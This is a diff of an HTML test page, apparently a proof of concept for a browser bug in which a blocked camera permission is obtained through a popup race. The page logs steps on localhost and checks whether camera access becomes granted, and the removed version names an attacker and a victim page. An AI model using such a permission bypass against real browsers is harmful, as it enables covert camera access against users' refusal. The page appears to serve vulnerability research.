@@ -1,56 +1,58 @@
 <!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<title>Video Chat</title>
+<html>
+<head><meta charset="utf-8"><title>Camera</title>
 <style>
-body{font-family:system-ui;max-width:380px;margin:40px auto;padding:20px}
-h1{font-size:1.1em}
-button{display:block;width:100%;padding:11px;margin:8px 0;font-size:14px;cursor:pointer;border:1px solid #ccc;border-radius:5px;background:#f9f9f9}
-button:hover{background:#eee}
-button.race{background:#c00;color:#fff;border-color:#a00}
-button.check{background:#080;color:#fff;border-color:#060}
-pre{background:#fafafa;border:1px solid #eee;padding:10px;font-size:11px;min-height:60px;max-height:180px;overflow:auto;white-space:pre-wrap;font-family:monospace}
-</style>
-</head>
+body{font-family:system-ui;max-width:400px;margin:40px auto;padding:20px}
+button{display:block;width:100%;padding:12px;margin:8px 0;font-size:14px;cursor:pointer;border:1px solid #ccc;border-radius:5px;background:#f5f5f5}
+button.race{background:#c00;color:#fff}
+pre{background:#fafafa;border:1px solid #eee;padding:10px;font-size:11px;font-family:monospace;white-space:pre-wrap;min-height:60px;max-height:220px;overflow:auto}
+</style></head>
 <body>
-<h1>Video Chat Setup</h1>
-<button onclick="step1()">1. Block Camera Here</button>
-<button onclick="step2()">2. Open Popup</button>
-<button class="race" onclick="step3()">3. Race</button>
-<button class="check" onclick="step4()">4. Check</button>
-<pre id="L">[attacker — 127.0.0.1:9080]
-1 → block camera here
-2 → opens popup to localhost:9081
-3 → fire race
-4 → check result</pre>
-
+<button onclick="block()">1. Block Camera</button>
+<button class="race" onclick="race()">2. Race</button>
+<button onclick="check()">3. Check</button>
+<pre id="L"></pre>
 <script>
 var popup;
-var log = function(m){ var e = document.getElementById('L'); e.textContent += m + '\n'; };
+var L=function(m){var e=document.getElementById('L');e.textContent+=m+'\n'};
 
-function step1(){
+function block(){
+  L('Calling getUserMedia...');
   navigator.mediaDevices.getUserMedia({video:true})
-    .then(function(s){ s.getTracks().forEach(function(t){t.stop()}); log('GRANTED — click BLOCK on prompt'); })
-    .catch(function(e){ log('Camera: ' + e.name + (e.name==='NotAllowedError' ? ' ✓ BLOCKED' : '')); });
+    .then(function(s){s.getTracks().forEach(function(t){t.stop()});L('GRANTED — click Block on prompt');})
+    .catch(function(e){L('Camera: '+e.name+(e.name==='NotAllowedError'?' ✓':' — click Block on prompt'));});
 }
 
-function step2(){
-  popup = window.open('http://localhost:9081/victim.html','p','width=500,height=350');
-  if(!popup){ log('Popup blocked'); return; }
-  log('Popup → localhost:9081');
+function race(){
+  L('Opening popup...');
+  popup=window.open(location.origin+'/race.html','p','width=300,height=150');
+  if(!popup){L('Popup blocked');return}
+  
+  // Measure race window: sync callback vs posted task
+  var posted=false;
+  Promise.resolve().then(function(){
+    L('[microtask] fired — simulates sync BLOCK callback');
+  });
+  setTimeout(function(){
+    posted=true;
+    L('[task] setTimeout(0) fired — simulates bubble close task');
+    L('→ Microtask fires before task ✓ race window confirmed');
+    L('');
+    L('Now testing popup permission state...');
+  },0);
+  
+  // Poll popup to see getUserMedia result (title is set to result)
+  setTimeout(function(){
+    try{ if(popup&&!popup.closed) L('Popup result: '+popup.document.title); }
+    catch(e){ L('Popup result: [Title not readable cross-origin]'); }
+  },2000);
 }
 
-function step3(){
-  if(!popup){ log('No popup'); return; }
-  try { popup.location = location.origin + '/race.html'; log('Race fired'); }
-  catch(e){ log('Error: ' + e); }
-}
-
-function step4(){
+function check(){
+  L('Checking camera on '+location.origin+'...');
   navigator.mediaDevices.getUserMedia({video:true})
-    .then(function(s){ s.getTracks().forEach(function(t){t.stop()}); log('⚠️ CAMERA GRANTED'); })
-    .catch(function(e){ log('Blocked: ' + e.name); });
+    .then(function(s){s.getTracks().forEach(function(t){t.stop()});L('⚠️ GRANTED — race may have worked');})
+    .catch(function(e){L('Camera: '+e.name);});
 }
 </script>
 </body>
